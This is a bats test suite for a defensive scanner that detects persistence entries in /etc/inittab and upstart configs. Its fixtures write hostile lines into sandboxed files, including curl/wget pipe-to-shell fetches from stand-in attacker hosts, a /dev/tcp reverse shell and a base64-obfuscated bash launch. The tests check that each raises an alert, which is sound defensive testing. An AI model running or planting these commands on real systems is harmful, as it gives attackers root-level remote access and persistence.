#!/usr/bin/env bats
# L2 bats functional tests for the inittab-watchdog scan script.
#
# /etc/inittab `id:runlevels:action:process` lines run `process` AS ROOT at
# boot; with `respawn` init even restarts it if killed — a resilient
# persistence vector. Only the exec actions (respawn/once/wait/boot/
# bootwait/sysinit/powerwait/powerfail) carry a payload. Also scans upstart
# /etc/init/*.conf `exec` lines. A process under a writable root (or an
# injection pattern in the line) is alert.
#
# Runs the actual scan script with `logger` shadowed on PATH and the config
# in a tmp sandbox via SELFDEF_INITTAB_FILE / _UPSTART.
#
# Run with: bats packaging/test/L2-inittab-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/inittab-watchdog/systemd/inittab-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    INITTAB="${TMP}/inittab"
    UPSTART="${TMP}/init"; mkdir -p "${UPSTART}"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_INITTAB_PROFILE="${PROFILE:-report}" \
    SELFDEF_INITTAB_BASELINE="${BASELINE}" \
    SELFDEF_INITTAB_FILE="${INITTAB_F:-$INITTAB}" \
    SELFDEF_INITTAB_UPSTART="${UPSTART_D:-$UPSTART}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

# ============================================================
# ok tier
# ============================================================

@test "no inittab / upstart → ok / no_inittab" {
    INITTAB_F="${TMP}/nonexistent" UPSTART_D="${TMP}/nonexistent.d" run_wd
    cap | grep -q '"event":"no_inittab"'
    cap | grep -q '"severity":"ok"'
}

@test "benign inittab, first run → ok / baseline_initial" {
    printf 'id:5:initdefault:\nsi::sysinit:/etc/init.d/rcS\n1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged inittab on second run → ok / inittab_intact" {
    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"inittab_intact"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# alert tier
# ============================================================

@test "a respawn process under a writable root → alert / inittab_suspicious" {
    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
    run_wd                                   # benign baseline
    printf '1:2345:respawn:/sbin/getty 38400 tty1\nx1:5:respawn:/tmp/.payload\n' > "${INITTAB}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"inittab_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "a once action carrying a curl|sh injection → alert" {
    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
    run_wd
    printf '1:2345:respawn:/sbin/getty 38400 tty1\nx1:5:once:/bin/sh -c "curl http://evil|sh"\n' > "${INITTAB}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "an upstart exec under a writable root → alert" {
    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
    run_wd
    printf 'start on runlevel [2345]\nexec /dev/shm/job\n' > "${UPSTART}/evil.conf"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

# ============================================================
# warn tier
# ============================================================

@test "a benign process change → warn / inittab_changed" {
    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
    run_wd
    printf '1:2345:respawn:/sbin/agetty 38400 tty1\n' > "${INITTAB}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"inittab_changed"'
    cap | grep -q '"severity":"warn"'
}

# ============================================================
# false-positive guards
# ============================================================

@test "standard getty respawn + initdefault are NOT flagged" {
    printf 'id:5:initdefault:\nca:12345:ctrlaltdel:/sbin/shutdown -t1 -a -r now\n1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# enforce profile
# ============================================================

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious process" {
    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
    run_wd
    printf 'x1:5:respawn:/tmp/.payload\n' > "${INITTAB}"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — inittab inventory enumerates boot-time root-exec surface)" {
    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (reverse-shell pattern in respawn): /dev/tcp reverse shell → alert" {
    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
    run_wd
    printf '1:2345:respawn:/sbin/getty 38400 tty1\nrs:5:respawn:bash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${INITTAB}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (wget-pipe-sh in once): wget bootstrap → alert" {
    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
    run_wd
    printf '1:2345:respawn:/sbin/getty 38400 tty1\nwg:5:once:wget -qO- http://attacker/p | sh\n' > "${INITTAB}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (base64-decode-pipe in sysinit): obfuscation → alert" {
    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
    run_wd
    printf '1:2345:respawn:/sbin/getty 38400 tty1\nb64::sysinit:echo YmFzaCAtaQ== | base64 -d | bash\n' > "${INITTAB}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (respawn under /var/tmp): writable-root expansion" {
    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
    run_wd
    printf '1:2345:respawn:/sbin/getty 38400 tty1\nx1:5:respawn:/var/tmp/.attacker-payload\n' > "${INITTAB}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (upstart exec carries an injection pattern): upstart axis also covered" {
    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
    run_wd
    printf 'start on runlevel [2345]\nexec bash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${UPSTART}/evil.conf"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (world-writable inittab file → alert)" {
    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
    run_wd
    chmod 0666 "${INITTAB}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-inittab -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no auto-trust): inittab-watchdog does NOT refresh baseline on suspicious-process detection — alert STAYS until operator updates" {
    # T1037 boot-time persistence — alert MUST persist across runs
    # until operator explicitly re-baselines.
    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
    run_wd
    printf '1:2345:respawn:/sbin/getty 38400 tty1\nx1:5:respawn:/tmp/.payload\n' > "${INITTAB}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"event":"inittab_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (commented suspicious respawn NOT flagged: # prefix filtered)" {
    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '1:2345:respawn:/sbin/getty 38400 tty1\n# x1:5:respawn:/tmp/.example-attacker\n' > "${INITTAB}"
    run_wd
    ! cap | grep -q '"event":"inittab_suspicious"'
    ! cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (bootwait + powerwait + powerfail actions all scanned — comprehensive exec-action coverage)" {
    # The watchdog scans ALL exec actions (not just respawn/once/sysinit).
    # Lock that bootwait/powerwait/powerfail are also covered.
    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '1:2345:respawn:/sbin/getty 38400 tty1\nbw::bootwait:/tmp/.bootwait-attacker\n' > "${INITTAB}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected in respawn)" {
    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '1:2345:respawn:/sbin/getty 38400 tty1\nrs:5:respawn:curl -s http://attacker.com/p | bash\n' > "${INITTAB}"
    run_wd
    cap | grep -q '"severity":"alert"'
}
